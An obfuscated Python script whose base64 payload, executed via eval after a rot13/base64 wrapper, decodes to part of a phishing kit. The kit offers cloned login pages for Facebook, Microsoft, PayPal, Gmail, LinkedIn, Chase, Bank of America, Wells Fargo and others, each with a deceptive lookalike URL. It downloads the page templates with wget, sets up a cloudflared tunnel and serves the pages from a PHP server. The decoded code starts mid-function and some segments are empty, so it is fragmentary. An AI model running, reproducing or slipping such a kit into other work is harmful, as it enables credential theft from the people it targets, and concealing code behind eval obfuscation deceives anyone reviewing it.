import base64, codecs
magic = ''
love = ''
god = 'ICAgICAgICAgICAgaWYgeC5maW5kKCJ4ODZfNjQiKSE9LTE6CiAgICAgICAgICAgICAgICBzeXN0ZW0oIndnZXQgLXEgLS1zaG93LXByb2dyZXNzICdodHRwczovL2dpdGh1Yi5jb20vY2xvdWRmbGFyZS9jbG91ZGZsYXJlZC9yZWxlYXNlcy9sYXRlc3QvZG93bmxvYWQvY2xvdWRmbGFyZWQtZGFyd2luLWFtZDY0LnRneicgLU8gJ2Nsb3VkZmxhcmVkLnRneiciKQogICAgICAgICAgICAgICAgc3lzdGVtKCJ0YXIgLXp4ZiBjbG91ZGZsYXJlZC50Z3ogPiAvZGV2L251bGwgMj4mMSAmJiBybSAtcmYgY2xvdWRmbGFyZWQudGd6IikKICAgICAgICAgICAgZWxpZiB4LmZpbmQoImFybTY0IikhPS0xOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7ZXJyb3J9Q2xvdWRmbGFyZWQgbm90IGF2YWlsYWJsZSBmb3IgZGV2aWNlIGFyY2hpdGVjdHVyZSEiKQogICAgICAgICAgICAgICAgc2xlZXAoMykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50KGYie2Vycm9yfURldmljZSBhcmNoaXRlY3R1cmUgdW5rbm93bi4gRG93bmxvYWQgY2xvdWRmbGFyZWQgbWFudWFsbHkhIikKICAgICAgICAgICAgICAgIHNsZWVwKDMpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcHJpbnQoZiJ7ZXJyb3J9RGV2aWNlIG5vdCBzdXBwb3J0ZWQhIikKICAgICAgICAgICAgZXhpdCgxKQogICAgICAgIHN5c3RlbSgibWtkaXIgJEhPTUUvLmNmZm9sZGVyIikKICAgICAgICBzeXN0ZW0oIm12IC1mIGNsb3VkZmxhcmVkICRIT01FLy5jZmZvbGRlciIpCiAgICAgICAgaWYgc3VkbzoKICAgICAgICAgICAgc3lzdGVtKCJzdWRvIGNobW9kICt4ICRIT01FLy5jZmZvbGRlci9jbG91ZGZsYXJlZCIpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc3lzdGVtKCJjaG1vZCAreCAkSE9NRS8uY2Zmb2xkZXIvY2xvdWRmbGFyZWQiKQogICAgaWYgc3lzdGVtKCJwaWRvZiBwaHAgPiAvZGV2L251bGwgMj4mMSIpPT0wOgogICAgICAgIHNwcmludChlcnJvcisiUHJldmlvdXMgcGhwIHN0aWxsIHJ1bm5pbmchIFBsZWFzZSByZXN0YXJ0IHRlcm1pbmFsIGFuZCB0cnkgYWdhaW4iK25jKQogICAgICAgIGV4aXQoKQogICAgaWYgc3lzdGVtKCJwaWRvZiBuZ3JvayA+IC9kZXYvbnVsbCAyPiYxIik9PTA6CiAgICAgICAgc3ByaW50KGVycm9yKyJQcmV2aW91cyBuZ3JvayBzdGlsbCBydW5uaW5nLiBQbGVhc2UgcmVzdGFydCB0ZXJtaW5hbCBhbmQgdHJ5IGFnYWluIituYykKICAgICAgICBleGl0KCkKICAgIHdoaWxlIFRydWU6CiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMocm9vdCsiLy5zaXRlIik6CiAgICAgICAgICAgIHN5c3RlbSgicm0gLXJmICRIT01FLy5zaXRlICYmIGNkICRIT01FICYmIG1rZGlyIC5zaXRlIikKICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbHNlOgogICAgICAgICAgICBzeXN0ZW0oImNkICRIT01FICYmIG1rZGlyIC5zaXRlIikKICAgICAgICAgICAgYnJlYWsKICAgIHdoaWxlIFRydWU6CiAgICAgICAgb3Muc3lzdGVtKCJjbGVhciIpCiAgICAgICAgc2xvd3ByaW50KGxvZ28pCiAgICAgICAgb3B0aW9ucygpCiAgICAgICAgY2hvb3NlPSBpbnB1dChhc2srIlNlbGVjdCBvbmUgb2YgdGhlIE9wdGlvbnMgPT4gIituYykKICAgICAgICBpZiBjaG9vc2UgPT0gIjEiIG9yIGNob29zZSA9PSAiMDEiOgogICAgICAgICAgICBmb2xkZXI9ImZhY2Vib29rIgogICAgICAgICAgICBtYXNrPSJodHRwczovL3ZlcmlmaWVkLWZhY2Vib29rLWFjY291bnQtbG9naW4tc2VydmVyIgogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjIiIG9yIGNob29zZSA9PSAiMDIiOgogICAgICAgICAgICBmb2xkZXI9Im9mZmljZSIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9nZXQtbWljcm9zb2Z0LmNvbS11cGRhdGUtbG9naW4tc2VydmVyJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjMiIG9yIGNob29zZSA9PSAiMDMiOgogICAgICAgICAgICBmb2xkZXI9Im91dGxvb2siCiAgICAgICAgICAgIG1hc2s9J2h0dHBzOi8vZ2V0LW91dGxvb2stbG9naW4tb3V0ZGF0ZWQtdXBkYXRlJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjQiIG9yIGNob29zZSA9PSAiMDQiOgogICAgICAgICAgICBmb2xkZXI9InlhaG9vIgogICAgICAgICAgICBtYXNrPSdodHRwczovL3VwZGF0ZS1sb2dpbi15YWhvby1iZXN0LW9ubGluZScKICAgICAgICAgICAgcmVxdWlyZW1lbnRzKGZvbGRlcixtYXNrKQogICAgICAgIGVsaWYgY2hvb3NlID09ICI1IiBvciBjaG9vc2UgPT0gIjA1IjoKICAgICAgICAgICAgZm9sZGVyPSJhZG9iZSIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9hZG9iZS1kb2N1bWVudHMtY2xvdWQtdXBkYXRlLWxvZ2luJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjYiIG9yIGNob29zZSA9PSAiMDYiOgogICAgICAgICAgICBmb2xkZXI9InBheXBhbCIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9sb2dpbi5wYXlwYWwuY29tLXVwZGF0ZS11c2QtLXRvLXlvdXItYWNjb3VudCcKICAgICAgICAgICAgcmVxdWlyZW1lbnRzKGZvbGRlcixtYXNrKQogICAgICAgIGVsaWYgY2hvb3NlID09ICI3IiBvciBjaG9vc2UgPT0gIjA3IjoKICAgICAgICAgICAgZm9sZGVyPSJsaW5rZWRpbiIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9sb2dpbi5saW5rZWRpbi5jb20tYmx1ZS1iYWRnZS1vbi1saW5rZWRpbi1hY2NvdW50JwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjgiIG9yIGNob29zZSA9PSAiMDgiOgogICAgICAgICAgICBmb2xkZXI9ImRyb3Bib3giCiAgICAgICAgICAgIG1hc2s9J2h0dHBzOi8vZHJvcGJveC1pbmZvcm1hdGlvbi11c2VyLXN0b3JhZ2UtbG9naW4nCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiOSIgb3IgY2hvb3NlID09ICIwOSI6CiAgICAgICAgICAgIGZvbGRlcj0id2VibWFpbCIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly93ZWJtYWlsLWxvZ2luLWluZm9ybWF0aW9uLXVwZGF0ZWQnCiAgICAgICAgICAgIHJlcXVpcmVtZW50cyhmb2xkZXIsbWFzaykKICAgICAgICBlbGlmIGNob29zZSA9PSAiMTAiOgogICAgICAgICAgICBmb2xkZXI9IndldHJhbnNmZXIiCiAgICAgICAgICAgIG1hc2s9J2h0dHBzOi8vd2V0cmFuc2Zlci5jb20tbG9naW4taW5mb3JtYXRpb24tdXBkYXRlZCcKICAgICAgICAgICAgcmVxdWlyZW1lbnRzKGZvbGRlcixtYXNrKQogICAgICAgIGVsaWYgY2hvb3NlID09ICIxMSI6CiAgICAgICAgICAgIGZvbGRlcj0id29yZHByZXNzIgogICAgICAgICAgICBtYXNrPSdodHRwczovL3dvcmRwcmVzcy1sb2dpbi1pbmZvcm1hdGlvbi11cGRhdGVkJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjEyIjoKICAgICAgICAgICAgZm9sZGVyPSJnbWFpbCIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly91cGdyYWRlLXlvdXItZ21haWwtcGxhbi1mcmVlJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjEzIjoKICAgICAgICAgICAgZm9sZGVyPSJlYmF5IgogICAgICAgICAgICBtYXNrPSdodHRwczovL2ViYXkuY29tLWFjY291bnQtbm90aWZpY2F0aW9uLWdpZnQtY2FyZC1mcmVlJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjE0IjoKICAgICAgICAgICAgZm9sZGVyPSJvdGhlciIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9sb2dpbi1pbmZvcm1hdGlvbi11cGRhdGVkJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjIwIjoKICAgICAgICAgICAgZm9sZGVyPSJjaGFzZSIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9nZXQtYS1wcmVtaXVtLWNoYXNlLWFjY291bnQtdXBkYXRlLWxvZ2luJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjIxIjoKICAgICAgICAgICAgZm9sZGVyPSJib2ZhIgogICAgICAgICAgICBtYXNrPSdodHRwczovL3ZpZXctYmFmby1hY2NvdW50LWxvZ2luLXVwZGF0ZScKICAgICAgICAgICAgcmVxdWlyZW1lbnRzKGZvbGRlcixtYXNrKQogICAgICAgIGVsaWYgY2hvb3NlID09ICIyMiI6CiAgICAgICAgICAgIGZvbGRlcj0id2VsbHMiCiAgICAgICAgICAgIG1hc2s9J2h0dHBzOi8vZ2V0LWEtcHJlbWl1bS13ZWxsc2ZhZ28uY29tLWZvci11bmxpbWl0ZWQtdXBkYXRlJwogICAgICAgICAgICByZXF1aXJlbWVudHMoZm9sZGVyLG1hc2spCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjIzIjoKICAgICAgICAgICAgZm9sZGVyPSJzdW50cnVzdCIKICAgICAgICAgICAgbWFzaz0naHR0cHM6Ly9nZXQtc3VudHJ1c3QuY29tLXVzZC1hY2NvdW50LXVwZGF0ZS1sb2dpbicKICAgICAgICAgICAgcmVxdWlyZW1lbnRzKGZvbGRlcixtYXNrKQogICAgICAgIGVsaWYgY2hvb3NlID09ICI5OSI6CiAgICAgICAgICAgIGFib3V0KCkKICAgICAgICBlbGlmIGNob29zZSA9PSAibSIgb3IgY2hvb3NlID09ICJNIjoKICAgICAgICAgICAgbW9yZSgpCiAgICAgICAgZWxpZiBjaG9vc2UgPT0gIjAiIG9yIGNob29zZSA9PSAiMDAiOgogICAgICAgICAgICBleGl0KDApCiAgICAgICAgZWxzZToKICAgICAgICAgICAgc3ByaW50KCJcbiIrZXJyb3IrIldyb25nIGlucHV0IikKICAgICAgICAgICAgbWFpbigpCgojIENvcHkgd2Vic2l0ZSBmaWxlcyBmcm9tIGN1c3RvbSBsb2NhdGlvbgpkZWYgY3VzdG9tZm9sKCk6CiAgICBmb2w9aW5wdXQoIlxuIithc2srIkVudGVyIHRoZSBkaXJlY3RvcnkgPiAiK2dyZWVuKQogICAgaWYgb3MucGF0aC5leGlzdHMoZm9sKToKICAgICAgICBpZiBvcy5wYXRoLmlzZmlsZShmb2wrIi9pbmRleC5waHAiKToKICAgICAgICAgICAgc3lzdGVtKCJjZCAiK2ZvbCsiICYmIHJtIC1yZiBpcC50eHQgdXNlcm5hbWVzLnR4dCAmJiBjcCAtciAqICRIT01FLy5zaXRlIikKICAgICAgICAgICAgc2VydmVyKCkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzcHJpbnQoZXJyb3IrIkluZGV4LnBocCByZXF1aXJlZCBidXQgbm90IGZvdW5kISIpCiAgICAgICAgICAgIG1haW4oKQogICAgZWxzZToKICAgICAgICBzcHJpbnQoZXJyb3IrIkRpcmVjdG9yeSBkbyBub3QgZXhpc3RzISIpCiAgICAgICAgbWFpbigpCgojIDJuZCBmdW5jdGlvbiBjaGVja2luZyByZXF1aXJlbWVudHMgYW5kIGRvd25sb2FkIGZpbGVzIApkZWYgcmVxdWlyZW1lbnRzKGZvbGRlcixtYXNrKToKICAgIGlmIG9zLnBhdGguaXNmaWxlKCJ3ZWJzaXRlcy56aXAiKToKICAgICAgICBzeXN0ZW0oInJtIC1yZiAkSE9NRS8ud2Vic2l0ZXMgJiYgY2QgJEhPTUUgJiYgbWtkaXIgLndlYnNpdGVzIikKICAgICAgICBzeXN0ZW0oInVuemlwIHdlYnNpdGVzLnppcCAtZCAkSE9NRS8ud2Vic2l0ZXMgPiAvZGV2L251bGwgMj4mMSIpCiAgICAgICAgb3MucmVtb3ZlKCJ3ZWJzaXRlcy56aXAiKQogICAgd2hpbGUgVHJ1ZToKICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyhyb290KyIvLndlYnNpdGVzLyIrZm9sZGVyKToKICAgICAgICAgICAgc3lzdGVtKCJjcCAtciAkSE9NRS8ud2Vic2l0ZXMvIitmb2xkZXIrIi8qICRIT01FLy5zaXRlIikKICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbHNlOgogICAgICAgICAgICBpbnRlcm5ldCgpCiAgICAgICAgICAgIHNwcmludCgiXG4iK2luZm8rIkRvd25sb2FkaW5nIHJlcXVpcmVkIGZpbGVzLi4uLi5cbiIpCiAgICAgICAgICAgIHN5c3RlbSgicm0gLXJmIHNpdGUuemlwIikKICAgICAgICAgICAgc3lzdGVtKCJ3Z2V0IC1xIC0tc2hvdy1wcm9ncmVzcyBodHRwczovL2dpdGh1Yi5jb20vbGhvc3QyNS9maWxlcy9yYXcvbWFpbi9wYWdlcy8iK2ZvbGRlcisiLnppcCAtTyBzaXRlLnppcCIpCiAgICAgICAgICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhyb290KyIvLndlYnNpdGVzIik6CiAgICAgICAgICAgICAgICBzeXN0ZW0oImNkICRIT01FICYmIG1rZGlyIC53ZWJzaXRlcyIpCiAgICAgICAgICAgIHN5c3RlbSgiY2QgJEhPTUUvLndlYnNpdGVzICYmIG1rZGlyICIrZm9sZGVyKQogICAgICAgICAgICBzeXN0ZW0oInVuemlwIHNpdGUuemlwIC1kICRIT01FLy53ZWJzaXRlcy8iK2ZvbGRlcikKICAgICAgICAgICAgb3MucmVtb3ZlKCJzaXRlLnppcCIpCiAgICAgICAgICAgIHN5c3RlbSgiY3AgLXIgJEhPTUUvLndlYnNpdGVzLyIrZm9sZGVyKyIvKiAkSE9NRS8uc2l0ZSIpCiAgICAgICAgICAgIGJyZWFrCiAgICB3aXRoIG9wZW4oIi5pbmZvLnR4dCIsICJ3IikgYXMgaW5mb3JtOgogICAgICAgIGluZm9ybS53cml0ZShtYXNrKQogICAgc3lzdGVtKCJtdiAtZiAuaW5mby50eHQgJEhPTUUvLnNpdGUiKQogICAgc2VydmVyKCkKCiMgU3RhcnQgc2VydmVyIGFuZCB0dW5uZWxpbmcKZGVmIHNlcnZlcigpOgogICAgc3lzdGVtKCJjbGVhciIpCiAgICBzbG93cHJpbnQobG9nbykKICAgIGlmIHRlcm11eDoKICAgICAgICBzcHJpbnQoIlxuIitpbmZvKyJJZiB5b3UgaGF2ZW4ndCBlbmFibGVkIGhvdHNwb3QsIHBsZWFzZSBlbmFibGUgaXQhIikKICAgICAgICBzbGVlcCgxKQogICAgc3ByaW50KCJcbiIraW5mbzIrIkluaXRpYWxpemluZyBQSFAgU2VydmVyLi4uLiIpCiAgICBpbnRlcm5ldCgpCiAgICBzeXN0ZW0oImNkICRIT01FLy5zaXRlICYmIHBocCAtUyAxMjcuMC4wLjE6ODA4MCA+IC9kZXYvbnVsbCAyPiYxICYiKQ'
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
